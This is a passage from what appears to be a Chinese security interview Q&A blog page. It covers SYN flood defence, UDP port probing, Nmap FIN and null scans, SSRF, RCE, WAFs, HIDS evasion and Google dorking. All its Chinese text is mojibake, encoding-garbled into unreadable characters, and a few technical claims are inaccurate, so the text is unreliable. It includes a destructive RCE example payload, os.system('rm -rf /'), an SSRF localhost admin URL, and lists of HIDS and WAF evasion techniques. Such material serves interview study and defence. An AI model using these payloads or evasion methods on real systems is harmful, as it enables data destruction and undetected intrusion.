‘ç¡®ä¿äº†æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ä¸ºO(log n)ï¼Œè€ŒäºŒå‰æœç´¢æ ‘åœ¨æœ€åæƒ…å†µä¸‹å¯èƒ½é€€åŒ–ä¸ºé“¾è¡¨ã€‚</p><h3 id="SYN-Flood-æ”»å‡»åŸç†åŠè§£å†³æ–¹æ¡ˆ"><a href="#SYN-Flood-æ”»å‡»åŸç†åŠè§£å†³æ–¹æ¡ˆ" class="headerlink" title="SYN Flood æ”»å‡»åŸç†åŠè§£å†³æ–¹æ¡ˆ"></a>SYN Flood æ”»å‡»åŸç†åŠè§£å†³æ–¹æ¡ˆ</h3><ol><li><strong>åŸç†</strong>ï¼šæ”»å‡»è€…å‘é€å¤§é‡SYNåŒ…åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œä½†ä¸å®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼Œå¯¼è‡´æœåŠ¡å™¨èµ„æºè€—å°½ã€‚</li><li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š<ul><li><strong>SYN Cookie</strong>ï¼šæœåŠ¡å™¨ä¸åˆ†é…èµ„æºï¼Œè€Œæ˜¯é€šè¿‡è®¡ç®—SYNåŒ…çš„åºåˆ—å·æ¥éªŒè¯åç»­çš„ACKåŒ…ã€‚</li><li><strong>é˜²ç«å¢™è¿‡æ»¤</strong>ï¼šé™åˆ¶æ¥è‡ªç‰¹å®šIPçš„SYNåŒ…æ•°é‡ã€‚</li></ul></li></ol><h3 id="SYN-åå‘æ¢æµ‹çš„åŸç†"><a href="#SYN-åå‘æ¢æµ‹çš„åŸç†" class="headerlink" title="SYN åå‘æ¢æµ‹çš„åŸç†"></a>SYN åå‘æ¢æµ‹çš„åŸç†</h3><p>SYNåå‘æ¢æµ‹æ˜¯ä¸€ç§æ£€æµ‹SYN Floodæ”»å‡»çš„æ–¹æ³•ã€‚é€šè¿‡åˆ†æç›®æ ‡æœåŠ¡å™¨çš„SYN-ACKåŒ…ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨å¼‚å¸¸æµé‡ã€‚</p><h3 id="TCP-SYN-Cookie-çš„åŸç†"><a href="#TCP-SYN-Cookie-çš„åŸç†" class="headerlink" title="TCP SYN Cookie çš„åŸç†"></a>TCP SYN Cookie çš„åŸç†</h3><p><a href="https://zhuanlan.zhihu.com/p/357887244">https://zhuanlan.zhihu.com/p/357887244</a><br>SYN Cookieæ˜¯ä¸€ç§é˜²å¾¡SYN Floodçš„æœºåˆ¶ã€‚æœåŠ¡å™¨åœ¨æ”¶åˆ°SYNåŒ…æ—¶ï¼Œä¸åˆ†é…èµ„æºï¼Œè€Œæ˜¯è®¡ç®—ä¸€ä¸ªCookieå€¼ï¼Œå¹¶å°†å…¶æ”¾å…¥SYN-ACKåŒ…ä¸­ã€‚å½“å®¢æˆ·ç«¯å‘é€ACKåŒ…æ—¶ï¼ŒæœåŠ¡å™¨éªŒè¯Cookieå€¼æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œåˆ¤æ–­è¯·æ±‚æ˜¯å¦åˆæ³•ã€‚</p><h3 id="UDPç«¯å£æ¢æµ‹çš„æœ‰æ•ˆæ–¹å¼"><a href="#UDPç«¯å£æ¢æµ‹çš„æœ‰æ•ˆæ–¹å¼" class="headerlink" title="UDPç«¯å£æ¢æµ‹çš„æœ‰æ•ˆæ–¹å¼"></a>UDPç«¯å£æ¢æµ‹çš„æœ‰æ•ˆæ–¹å¼</h3><ol><li><strong>ä½¿ç”¨ <code>nc</code> (netcat) å·¥å…·</strong>ï¼š<ul><li>é€šè¿‡å‘é€ UDP æ•°æ®åŒ…æ¥æµ‹è¯•ç«¯å£æ˜¯å¦å¯è¾¾ã€‚ä¾‹å¦‚ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> | nc -u serverB 123</span><br></pre></td></tr></table></figure>è¿™é‡Œ <code>-u</code> è¡¨ç¤ºä½¿ç”¨ UDP åè®®ã€‚</li></ul></li><li><strong>ä½¿ç”¨ <code>socat</code> å·¥å…·</strong>ï¼š<ul><li>å‘é€ UDP æ•°æ®åŒ…æµ‹è¯•ç«¯å£ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> | socat - udp4:serverB:123</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ä½¿ç”¨ <code>dig</code> å·¥å…·</strong>ï¼š<ul><li>æµ‹è¯• DNS æœåŠ¡ï¼ˆé€šå¸¸ä½¿ç”¨ UDP ç«¯å£ 53ï¼‰ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @serverB example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ç¼–å†™è„šæœ¬æˆ–ç¨‹åº</strong>ï¼š<ul><li>ä½¿ç”¨ Python çš„ <code>socket</code> æ¨¡å—å‘é€ UDP æ•°æ®åŒ…ï¼š<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">message = <span class="string">b&#x27;Hello, UDP!&#x27;</span></span><br><span class="line">sock.sendto(message, (<span class="string">&#x27;serverB&#x27;</span>, <span class="number">123</span>))</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="Nmapçš„FINæ‰«æå’Œç©ºæ‰«æ"><a href="#Nmapçš„FINæ‰«æå’Œç©ºæ‰«æ" class="headerlink" title="Nmapçš„FINæ‰«æå’Œç©ºæ‰«æ"></a>Nmapçš„FINæ‰«æå’Œç©ºæ‰«æ</h3><ol><li><strong>FINæ‰«æ</strong>ï¼š<ul><li>å‘é€ä¸€ä¸ªè®¾ç½®äº† FIN æ ‡å¿—çš„ TCP æ•°æ®åŒ…ã€‚å¦‚æœæ”¶åˆ° RST å“åº”ï¼Œåˆ™ç«¯å£å…³é—­ï¼›å¦‚æœæ²¡æœ‰å“åº”ï¼Œåˆ™ç«¯å£å¼€æ”¾æˆ–è¢«è¿‡æ»¤ã€‚å‘½ä»¤ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sF 192.168.1.1</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ç©ºæ‰«æ</strong>ï¼š<ul><li>å‘é€æœªè®¾ç½®ä»»ä½•æ ‡å¿—çš„ TCP æ•°æ®åŒ…ã€‚å¦‚æœæ”¶åˆ° RST å“åº”ï¼Œåˆ™ç«¯å£å…³é—­ï¼›å¦‚æœæ²¡æœ‰å“åº”ï¼Œåˆ™ç«¯å£å¼€æ”¾æˆ–è¢«è¿‡æ»¤ã€‚å‘½ä»¤ï¼š<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sN 192.168.1.1</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="ä¸‰æ¬¡æ¡æ‰‹çš„åºåˆ—å·å˜åŒ–"><a href="#ä¸‰æ¬¡æ¡æ‰‹çš„åºåˆ—å·å˜åŒ–" class="headerlink" title="ä¸‰æ¬¡æ¡æ‰‹çš„åºåˆ—å·å˜åŒ–"></a>ä¸‰æ¬¡æ¡æ‰‹çš„åºåˆ—å·å˜åŒ–</h3><ol><li><strong>å®¢æˆ·ç«¯å‘é€ SYN</strong>ï¼š<ul><li>å®¢æˆ·ç«¯éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åºåˆ—å·ï¼ˆISNï¼‰ï¼Œå‘é€åˆ°æœåŠ¡å™¨ã€‚</li></ul></li><li><strong>æœåŠ¡å™¨å“åº” SYN&#x2F;ACK</strong>ï¼š<ul><li>æœåŠ¡å™¨æ”¶åˆ° SYN åï¼Œç”Ÿæˆè‡ªå·±çš„åˆå§‹åºåˆ—å·ï¼Œå¹¶å°†å®¢æˆ·ç«¯çš„ ISN åŠ  1 ä½œä¸ºç¡®è®¤å·ã€‚</li></ul></li><li><strong>å®¢æˆ·ç«¯å‘é€ ACK</strong>ï¼š<ul><li>å®¢æˆ·ç«¯å°†æœåŠ¡å™¨çš„ ISN åŠ  1 ä½œä¸ºç¡®è®¤å·ï¼Œå‘é€ ACK ç»™æœåŠ¡å™¨ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ã€‚</li></ul></li></ol><h3 id="Pythonçš„å€¼ç±»å‹å’Œå¼•ç”¨ç±»å‹"><a href="#Pythonçš„å€¼ç±»å‹å’Œå¼•ç”¨ç±»å‹" class="headerlink" title="Pythonçš„å€¼ç±»å‹å’Œå¼•ç”¨ç±»å‹"></a>Pythonçš„å€¼ç±»å‹å’Œå¼•ç”¨ç±»å‹</h3><ol><li><strong>å€¼ç±»å‹</strong>ï¼š<ul><li>åŒ…æ‹¬æ•´æ•°ã€æµ®ç‚¹æ•°ã€å¸ƒå°”å€¼ã€å­—ç¬¦ä¸²ç­‰ã€‚å®ƒä»¬æ˜¯ä¸å¯å˜çš„ï¼Œèµ‹å€¼æ—¶ä¼šåˆ›å»ºæ–°çš„å¯¹è±¡ã€‚</li></ul></li><li><strong>å¼•ç”¨ç±»å‹</strong>ï¼š<ul><li>åŒ…æ‹¬åˆ—è¡¨ã€å­—å…¸ã€é›†åˆç­‰ã€‚å®ƒä»¬æ˜¯å¯å˜çš„ï¼Œèµ‹å€¼æ—¶åªæ˜¯å¼•ç”¨çš„ä¼ é€’ã€‚</li></ul></li></ol><h3 id="Pythonçš„listå’Œdictçº¿ç¨‹å®‰å…¨å—"><a href="#Pythonçš„listå’Œdictçº¿ç¨‹å®‰å…¨å—" class="headerlink" title="Pythonçš„listå’Œdictçº¿ç¨‹å®‰å…¨å—"></a>Pythonçš„listå’Œdictçº¿ç¨‹å®‰å…¨å—</h3><ol><li><strong>çº¿ç¨‹å®‰å…¨</strong>ï¼š<ul><li>Python çš„ <code>list</code> å’Œ <code>dict</code> ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œå¯¹å®ƒä»¬çš„å¹¶å‘æ“ä½œå¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚</li></ul></li><li><strong>è§£å†³æ–¹æ³•</strong>ï¼š<ul><li>ä½¿ç”¨é”ï¼ˆå¦‚ <code>threading.Lock</code>ï¼‰æ¥ä¿æŠ¤å¯¹å…±äº«èµ„æºçš„è®¿é—®ã€‚</li></ul></li></ol><h3 id="ç»“åˆå®é™…çš„ä¾‹å­è¯´è¯´SSRF"><a href="#ç»“åˆå®é™…çš„ä¾‹å­è¯´è¯´SSRF" class="headerlink" title="ç»“åˆå®é™…çš„ä¾‹å­è¯´è¯´SSRF"></a>ç»“åˆå®é™…çš„ä¾‹å­è¯´è¯´SSRF</h3><ol><li><strong>SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰</strong>ï¼š<ul><li>æ”»å‡»è€…é€šè¿‡æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œè¯±å¯¼æœåŠ¡å™¨å‘å†…éƒ¨ç½‘ç»œæˆ–å¤–éƒ¨ç½‘ç»œå‘é€è¯·æ±‚ã€‚</li></ul></li><li><strong>ç¤ºä¾‹</strong>ï¼š<ul><li>æŸç½‘ç«™çš„å›¾ç‰‡ä¸Šä¼ åŠŸèƒ½å…è®¸ç”¨æˆ·è¾“å…¥ URL æ¥åŠ è½½å›¾ç‰‡ã€‚æ”»å‡»è€…å¯ä»¥è¾“å…¥ <code>http://localhost:8080/admin</code>ï¼Œå¯¼è‡´æœåŠ¡å™¨å‘æœ¬åœ°çš„ç®¡ç†é¡µé¢å‘é€è¯·æ±‚ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚</li></ul></li></ol><h3 id="ç»“åˆå®é™…çš„ä¾‹å­è®²è®²RCE"><a href="#ç»“åˆå®é™…çš„ä¾‹å­è®²è®²RCE" class="headerlink" title="ç»“åˆå®é™…çš„ä¾‹å­è®²è®²RCE"></a>ç»“åˆå®é™…çš„ä¾‹å­è®²è®²RCE</h3><ol><li><strong>RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</strong>ï¼š<ul><li>æ”»å‡»è€…é€šè¿‡æ¼æ´åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚</li></ul></li><li><strong>ç¤ºä¾‹</strong>ï¼š<ul><li>æŸ Web åº”ç”¨å…è®¸ç”¨æˆ·è¾“å…¥å‘½ä»¤æ¥æ‰§è¡ŒæŸäº›æ“ä½œã€‚å¦‚æœè¾“å…¥æœªç»è¿‡æ»¤ï¼Œæ”»å‡»è€…å¯ä»¥è¾“å…¥ <code>os.system(&#39;rm -rf /&#39;)</code>ï¼Œå¯¼è‡´æœåŠ¡å™¨åˆ é™¤æ‰€æœ‰æ–‡ä»¶ã€‚</li></ul></li></ol><h3 id="ä¸ºä»€ä¹ˆç°åœ¨æ–‡ä»¶ä¸Šä¼ å¾ˆå°‘äº†"><a href="#ä¸ºä»€ä¹ˆç°åœ¨æ–‡ä»¶ä¸Šä¼ å¾ˆå°‘äº†" class="headerlink" title="ä¸ºä»€ä¹ˆç°åœ¨æ–‡ä»¶ä¸Šä¼ å¾ˆå°‘äº†"></a>ä¸ºä»€ä¹ˆç°åœ¨æ–‡ä»¶ä¸Šä¼ å¾ˆå°‘äº†</h3><ol><li><strong>å®‰å…¨é£é™©</strong>ï¼š<ul><li>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½å®¹æ˜“è¢«åˆ©ç”¨æ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼ˆå¦‚ Webshellï¼‰ï¼Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚</li></ul></li><li><strong>æ›¿ä»£æ–¹æ¡ˆ</strong>ï¼š<ul><li>ä½¿ç”¨ API æˆ–äº‘å­˜å‚¨æœåŠ¡æ¥å¤„ç†æ–‡ä»¶ï¼Œå‡å°‘ç›´æ¥ä¸Šä¼ çš„é£é™©ã€‚</li></ul></li></ol><h3 id="åŸºäºè¯­ä¹‰åˆ†æçš„WAFäº†è§£å—"><a href="#åŸºäºè¯­ä¹‰åˆ†æçš„WAFäº†è§£å—" class="headerlink" title="åŸºäºè¯­ä¹‰åˆ†æçš„WAFäº†è§£å—"></a>åŸºäºè¯­ä¹‰åˆ†æçš„WAFäº†è§£å—</h3><ol><li><strong>è¯­ä¹‰åˆ†æ</strong>ï¼š<ul><li>åŸºäºè¯­ä¹‰åˆ†æçš„ WAF é€šè¿‡åˆ†æè¯·æ±‚çš„è¯­ä¹‰ï¼Œè¯†åˆ«æ½œåœ¨çš„æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡è§£æ SQL æŸ¥è¯¢çš„ç»“æ„ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º SQL æ³¨å…¥ã€‚</li></ul></li><li><strong>ä¼˜åŠ¿</strong>ï¼š<ul><li>èƒ½å¤Ÿæ›´å‡†ç¡®åœ°è¯†åˆ«å¤æ‚æ”»å‡»ï¼Œå‡å°‘è¯¯æŠ¥ã€‚</li></ul></li><li><strong>ç¤ºä¾‹</strong>ï¼š<ul><li>æŸ WAF é€šè¿‡è§£æ SQL æŸ¥è¯¢ï¼Œå‘ç°è¯·æ±‚ä¸­åŒ…å« <code>UNION SELECT</code>ï¼Œåˆ¤æ–­ä¸º SQL æ³¨å…¥æ”»å‡»ã€‚</li></ul></li></ol><h3 id="Javaçš„Classæ–‡ä»¶ç»“æ„"><a href="#Javaçš„Classæ–‡ä»¶ç»“æ„" class="headerlink" title="Javaçš„Classæ–‡ä»¶ç»“æ„"></a>Javaçš„Classæ–‡ä»¶ç»“æ„</h3><p>Javaçš„Classæ–‡ä»¶æ˜¯ä¸€ç§äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨äºå­˜å‚¨Javaç¨‹åºçš„ç¼–è¯‘ç»“æœã€‚å®ƒç”±å¤šä¸ªéƒ¨åˆ†ç»„æˆï¼ŒåŒ…æ‹¬é­”æ•°ã€å¸¸é‡æ± ã€è®¿é—®æ ‡è®°ã€ç±»ç´¢å¼•ã€çˆ¶ç±»ç´¢å¼•ã€æ¥å£ç´¢å¼•ã€å­—æ®µè¡¨ã€æ–¹æ³•è¡¨ç­‰ã€‚ä»¥ä¸‹æ˜¯Classæ–‡ä»¶çš„ä¸»è¦ç»“æ„ï¼š</p><ol><li><strong>é­”æ•°</strong>ï¼šClassæ–‡ä»¶çš„å¼€å¤´æ˜¯é­”æ•°<code>cafebabe</code>ï¼Œè¿™æ˜¯JVMè¯†åˆ«Classæ–‡ä»¶çš„æ ‡å¿—ã€‚</li><li><strong>å¸¸é‡æ± </strong>ï¼šå­˜å‚¨ç±»ä¸­ä½¿ç”¨çš„å¸¸é‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬å­—ç¬¦ä¸²ã€ç±»åã€æ–¹æ³•åç­‰ã€‚å¸¸é‡æ± çš„ç»“æ„å¦‚ä¸‹ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CONSTANT_Utf8_info &#123;</span><br><span class="line">    u1 tag;</span><br><span class="line">    u2 length;</span><br><span class="line">    u1 bytes[length];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>è®¿é—®æ ‡è®°</strong>ï¼šæè¿°ç±»çš„è®¿é—®æƒé™ï¼Œå¦‚<code>public</code>ã€<code>final</code>ç­‰ã€‚</li><li><strong>ç±»ç´¢å¼•ã€çˆ¶ç±»ç´¢å¼•å’Œæ¥å£ç´¢å¼•</strong>ï¼šæè¿°ç±»çš„ç»§æ‰¿å…³ç³»ã€‚</li><li><strong>å­—æ®µè¡¨</strong>ï¼šå­˜å‚¨ç±»çš„å­—æ®µä¿¡æ¯ï¼ŒåŒ…æ‹¬å­—æ®µåã€ç±»å‹ã€è®¿é—®æƒé™ç­‰ã€‚</li><li><strong>æ–¹æ³•è¡¨</strong>ï¼šå­˜å‚¨ç±»çš„æ–¹æ³•ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–¹æ³•åã€å‚æ•°ã€è¿”å›å€¼ç­‰ã€‚</li></ol><h3 id="CSPæ˜¯å¦‚ä½•é˜²å¾¡XSSçš„"><a href="#CSPæ˜¯å¦‚ä½•é˜²å¾¡XSSçš„" class="headerlink" title="CSPæ˜¯å¦‚ä½•é˜²å¾¡XSSçš„"></a>CSPæ˜¯å¦‚ä½•é˜²å¾¡XSSçš„</h3><p>å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé˜²æ­¢XSSæ”»å‡»ã€‚å…¶å·¥ä½œåŸç†å¦‚ä¸‹ï¼š</p><ol><li><strong>ç­–ç•¥å®šä¹‰</strong>ï¼šé€šè¿‡HTTPå“åº”å¤´å®šä¹‰CSPç­–ç•¥ï¼Œé™åˆ¶èµ„æºçš„åŠ è½½æ¥æºã€‚</li><li><strong>æŒ‡ä»¤ä½¿ç”¨</strong>ï¼šä½¿ç”¨æŒ‡ä»¤å¦‚<code>default-src</code>ã€<code>script-src</code>ç­‰ï¼ŒæŒ‡å®šå…è®¸åŠ è½½çš„èµ„æºç±»å‹å’Œæ¥æºã€‚</li><li><strong>æŠ¥å‘Šæœºåˆ¶</strong>ï¼šé€šè¿‡<code>report-uri</code>æŒ‡ä»¤ï¼Œå°†è¿åç­–ç•¥çš„äº‹ä»¶å‘é€åˆ°æŒ‡å®šçš„æŠ¥å‘ŠæœåŠ¡å™¨ã€‚</li></ol><p>ç¤ºä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="è…¾è®¯"><a href="#è…¾è®¯" class="headerlink" title="è…¾è®¯"></a>è…¾è®¯</h2><h3 id="1-ä¼ä¸šæœ‰HIDSçš„æƒ…å†µä¸‹æ€ä¹ˆæ”»å‡»"><a href="#1-ä¼ä¸šæœ‰HIDSçš„æƒ…å†µä¸‹æ€ä¹ˆæ”»å‡»" class="headerlink" title="1. ä¼ä¸šæœ‰HIDSçš„æƒ…å†µä¸‹æ€ä¹ˆæ”»å‡»"></a>1. ä¼ä¸šæœ‰HIDSçš„æƒ…å†µä¸‹æ€ä¹ˆæ”»å‡»</h3><ul><li><strong>æ— æ–‡ä»¶æ”»å‡»</strong>ï¼šåˆ©ç”¨å†…å­˜ä¸­çš„æ¶æ„è„šæœ¬æˆ–å·¥å…·ï¼ˆå¦‚PowerShellï¼‰æ‰§è¡Œæ”»å‡»ï¼Œé¿å…åœ¨ç£ç›˜ä¸Šç•™ä¸‹ç—•è¿¹ï¼Œä»è€Œç»•è¿‡HIDSçš„æ–‡ä»¶ç›‘æ§ã€‚</li><li><strong>æ··æ·†æŠ€æœ¯</strong>ï¼šå¯¹æ¶æ„ä»£ç è¿›è¡Œæ··æ·†ï¼Œä½¿å…¶éš¾ä»¥è¢«HIDSçš„ç­¾åæ£€æµ‹è¯†åˆ«ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡åŠ å¯†æˆ–ç¼–ç æŠ€æœ¯éšè—æ¶æ„ä»£ç ã€‚</li><li><strong>åˆ©ç”¨åˆæ³•å·¥å…·</strong>ï¼šä½¿ç”¨ä¼ä¸šå†…éƒ¨åˆæ³•çš„å·¥å…·ï¼ˆå¦‚ç®¡ç†å·¥å…·ï¼‰è¿›è¡Œæ”»å‡»ï¼Œè¿™äº›å·¥å…·é€šå¸¸ä¸ä¼šè¢«HIDSæ ‡è®°ä¸ºæ¶æ„ã€‚</li><li><strong>ä½é¢‘ç‡æ”»å‡»</strong>ï¼šé€šè¿‡ä½é¢‘ç‡çš„æ”»å‡»è¡Œä¸ºå‡å°‘HIDSçš„è­¦æŠ¥è§¦å‘ï¼Œä¾‹å¦‚åˆ†é˜¶æ®µæ‰§è¡Œæ”»å‡»æ­¥éª¤ã€‚</li></ul><h3 id="2-ä¼ä¸šè¦æ€ä¹ˆåšæ•æ„Ÿæ•°æ®æ³„éœ²çš„é˜²æŠ¤"><a href="#2-ä¼ä¸šè¦æ€ä¹ˆåšæ•æ„Ÿæ•°æ®æ³„éœ²çš„é˜²æŠ¤" class="headerlink" title="2. ä¼ä¸šè¦æ€ä¹ˆåšæ•æ„Ÿæ•°æ®æ³„éœ²çš„é˜²æŠ¤"></a>2. ä¼ä¸šè¦æ€ä¹ˆåšæ•æ„Ÿæ•°æ®æ³„éœ²çš„é˜²æŠ¤</h3><ul><li><strong>æ•°æ®åŠ å¯†</strong>ï¼šå¯¹æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œç¡®ä¿å³ä½¿æ•°æ®è¢«çªƒå–ä¹Ÿæ— æ³•è¢«è§£è¯»ã€‚ä½¿ç”¨å¼ºåŠ å¯†ç®—æ³•å¦‚AES-256ã€‚</li><li><strong>è®¿é—®æ§åˆ¶</strong>ï¼šå®æ–½æœ€å°æƒé™åŸåˆ™ï¼Œä»…æˆäºˆå‘˜å·¥å®Œæˆå·¥ä½œæ‰€éœ€çš„æœ€ä½æƒé™ï¼Œå¹¶å®šæœŸå®¡æŸ¥æƒé™è®¾ç½®ã€‚</li><li><strong>éƒ¨ç½²DLPç³»ç»Ÿ</strong>ï¼šå®æ—¶ç›‘æ§æ•°æ®æµåŠ¨ï¼Œè¯†åˆ«å¹¶é˜»æ­¢æœªç»æˆæƒçš„æ•°æ®ä¼ è¾“è¡Œä¸ºã€‚</li><li><strong>å¤šå› ç´ èº«ä»½éªŒè¯ï¼ˆMFAï¼‰</strong>ï¼šåœ¨é‡è¦ç³»ç»Ÿå’Œé«˜æƒé™è´¦æˆ·ä¸Šå¯ç”¨MFAï¼Œå¢å¼ºè´¦æˆ·å®‰å…¨æ€§ã€‚</li><li><strong>å‘˜å·¥åŸ¹è®­</strong>ï¼šå®šæœŸå¼€å±•å®‰å…¨åŸ¹è®­ï¼Œæé«˜å‘˜å·¥å¯¹æ•°æ®æ³„éœ²å¨èƒçš„è¯†åˆ«èƒ½åŠ›ã€‚</li></ul><h3 id="3-èŠHWä¸­çš„ç»•è¿‡æˆ–æŠ€å·§æ€§å¼ºçš„ç»å†"><a href="#3-èŠHWä¸­çš„ç»•è¿‡æˆ–æŠ€å·§æ€§å¼ºçš„ç»å†" class="headerlink" title="3. èŠHWä¸­çš„ç»•è¿‡æˆ–æŠ€å·§æ€§å¼ºçš„ç»å†"></a>3. èŠHWä¸­çš„ç»•è¿‡æˆ–æŠ€å·§æ€§å¼ºçš„ç»å†</h3><ul><li><strong>WAFç»•è¿‡</strong>ï¼šé€šè¿‡åˆ†å‰²æ”»å‡»ã€å…³é”®å­—æ··æ·†ï¼ˆå¦‚å¤§å°å†™æ··æ·†ã€åˆ†è¯æ³•ï¼‰æˆ–ä½¿ç”¨åˆæ³•å­—ç¬¦æ›¿ä»£æ¶æ„å­—ç¬¦æ¥ç»•è¿‡WAFæ£€æµ‹ã€‚</li><li><strong>åè®®ä¼ªè£…</strong>ï¼šå°†æ¶æ„æµé‡å°è£…åœ¨çœ‹ä¼¼æ­£å¸¸çš„åè®®ï¼ˆå¦‚HTTPï¼‰ä¸­ï¼Œç»•è¿‡é˜²ç«å¢™çš„é™åˆ¶ã€‚</li><li><strong>æµé‡åˆ†ç‰‡</strong>ï¼šä½¿ç”¨å·¥å…·å¦‚<code>Scapy</code>å°†æ¶æ„æ•°æ®åŒ…åˆ†ç‰‡ï¼Œä½¿é˜²ç«å¢™æˆ–IDS&#x2F;IPSéš¾ä»¥é‡ç»„å’Œæ£€æµ‹å®Œæ•´çš„æ¶æ„æµé‡ã€‚</li></ul><h3 id="4-TCPæ‹¥å¡æ§åˆ¶å’Œæ…¢å¯åŠ¨"><a href="#4-TCPæ‹¥å¡æ§åˆ¶å’Œæ…¢å¯åŠ¨" class="headerlink" title="4. TCPæ‹¥å¡æ§åˆ¶å’Œæ…¢å¯åŠ¨"></a>4. TCPæ‹¥å¡æ§åˆ¶å’Œæ…¢å¯åŠ¨</h3><ul><li><strong>æ…¢å¯åŠ¨</strong>ï¼šåœ¨TCPè¿æ¥å»ºç«‹åˆæœŸï¼Œå‘é€æ–¹é€æ¸å¢åŠ å‘é€çª—å£çš„å¤§å°ï¼Œç›´åˆ°è¾¾åˆ°ç½‘ç»œçš„æ‹¥å¡é˜ˆå€¼ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå‘é€æ–¹å¯ä»¥æ¢æµ‹ç½‘ç»œçš„å¯ç”¨å¸¦å®½ã€‚</li><li><strong>æ‹¥å¡æ§åˆ¶</strong>ï¼šå½“æ£€æµ‹åˆ°ç½‘ç»œæ‹¥å¡ï¼ˆå¦‚ä¸¢åŒ…ï¼‰æ—¶ï¼Œå‘é€æ–¹ä¼šå‡å°å‘é€çª—å£ï¼Œé™ä½å‘é€é€Ÿç‡ï¼Œä»¥é¿å…è¿›ä¸€æ­¥çš„æ‹¥å¡ã€‚å¸¸ç”¨çš„æ‹¥å¡æ§åˆ¶ç®—æ³•åŒ…æ‹¬Renoå’ŒCubicã€‚</li></ul><h3 id="5-è°·æ­Œè¯­æ³•ï¼šæ€ä¹ˆæ”¶é›†å­åŸŸå"><a href="#5-è°·æ­Œè¯­æ³•ï¼šæ€ä¹ˆæ”¶é›†å­åŸŸå" class="headerlink" title="5. è°·æ­Œè¯­æ³•ï¼šæ€ä¹ˆæ”¶é›†å­åŸŸå"></a>5. è°·æ­Œè¯­æ³•ï¼šæ€ä¹ˆæ”¶é›†å­åŸŸå</h3><ul><li>ä½¿ç”¨<code>site:</code>è¯­æ³•ï¼šä¾‹å¦‚<code>site:example.com</code>ï¼Œå¯ä»¥åˆ—å‡ºexample.comçš„æ‰€æœ‰å­åŸŸåã€‚</li><li>ä½¿ç”¨<code>inurl:</code>è¯­æ³•ï¼šä¾‹å¦‚<code>inurl:example.com</code>ï¼Œå¯ä»¥æŸ¥æ‰¾åŒ…å«example.comçš„URLã€‚</li><li>ä½¿ç”¨<code>intext:</code>è¯­æ³•ï¼šä¾‹å¦‚<code>intext:example.com</code>ï¼Œå¯ä»¥æŸ¥æ‰¾åŒ…å«example.comçš„æ–‡æœ¬å†…å®¹ã€‚</li></ul><h3 id="6-è°·æ­Œè¯­æ³•ï¼šè¯†åˆ«æŒ‡çº¹çš„æ—¶å€™ï¼Œå¦‚ä½•æœç´¢è·¯å¾„"><a 